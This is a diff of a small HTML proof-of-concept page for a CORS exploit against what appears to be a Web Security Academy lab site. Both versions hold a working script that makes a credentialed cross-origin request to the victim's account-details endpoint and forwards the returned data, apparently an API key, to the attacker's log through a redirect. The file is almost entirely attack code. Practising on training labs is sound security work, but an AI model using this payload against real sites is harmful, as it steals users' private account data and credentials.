@@ -1,24 +1,16 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>CORS PoC</title>
-</head>
-<body>
-    <h2>CORS Exploit PoC</h2>
-    <button onclick="sendRequest()">Send CORS Request</button>
-    <pre id="response"></pre>
+<html>
+    <body>
 
-    <script>
-        var req = new XMLHttpRequest();
-        req.onload = reqListener;
-        req.open('get','https://0add00400369e19d8095a868003100a0.web-security-academy.net/accountDetails',true);
-        req.withCredentials = true;
-        req.send();
+        <script>
+            var req = new XMLHttpRequest();
+            req.onload = reqListener;
+            req.open('get','https://0add00400369e19d8095a868003100a0.web-security-academy.net/accountDetails',true);
+            req.withCredentials = true;
+            req.send();
 
-        function reqListener() {
-            location='/log?key='+this.responseText;
-        };
-    </script>
-</body>
+            function reqListener() {
+                location='/log?key='+this.responseText;
+            };
+        </script>
+    </body>
 </html>
